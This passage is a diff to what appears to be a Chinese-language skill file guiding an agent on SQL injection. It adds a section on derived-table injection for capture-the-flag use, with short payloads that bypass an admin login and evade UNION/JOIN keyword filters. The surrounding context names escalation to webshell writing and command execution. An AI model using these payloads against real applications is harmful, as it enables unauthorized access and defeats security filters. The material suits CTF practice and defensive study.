@@ -121,3 +121,28 @@ description: Use when encountering 堆叠查询注入技术 - mysql/mssql/postgr
 3. MySQL: INTO OUTFILE → 文件写入 → WebShell(需要FILE权限)
 4. Oracle: Java存储过程 → 命令执行
 ```
+
+## 虚拟表注入（Derived Table）
+
+### 原理
+通过子查询在内存中创建临时表，绕过表名限制和字段级过滤。
+
+### CTF 常用场景
+```sql
+-- 管理员登录绕过
+SELECT username, password FROM
+(SELECT 'admin' username, '123' password) a
+WHERE username = 'admin' AND password = '123'
+
+-- 简洁写法
+(SELECT'admin'u,'1'p)x
+(SELECT'admin'a,'pwd'b)t
+
+-- 绕过 UNION/JOIN 检测
+SELECT * FROM (SELECT 'admin' AS username, 'password' AS password) t
+```
+
+### 优势
+1. 规避 UNION、JOIN 等敏感关键字检测
+2. 完全控制返回的字段和值
+3. 外层 WHERE、ORDER BY 正常生效
